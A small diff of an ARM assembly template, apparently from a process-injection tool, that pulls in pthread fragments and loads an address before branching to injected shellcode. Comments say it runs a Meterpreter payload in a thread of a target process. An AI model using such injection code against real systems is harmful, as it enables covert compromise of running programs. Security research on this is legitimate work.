@@ -8,14 +8,11 @@
 # happily execute in a separate thread, but if you execute the "exit" 
 # command from the Meterpreter shell, it will kill the entire target process
 
-b execute_precompiled_threaded_main
-// import reusable code fragments
 [FRAGMENT:asminject_libpthread_pthread_create.s:FRAGMENT]
 [FRAGMENT:asminject_libpthread_pthread_detach.s:FRAGMENT]
 [FRAGMENT:asminject_libpthread_pthread_exit.s:FRAGMENT]
 [FRAGMENT:asminject_nanosleep.s:FRAGMENT]
 
-execute_precompiled_threaded_main:
 // load the arbitrary read/write address into r0
 	ldr r0, [pc]
 	b load_shellcode_address
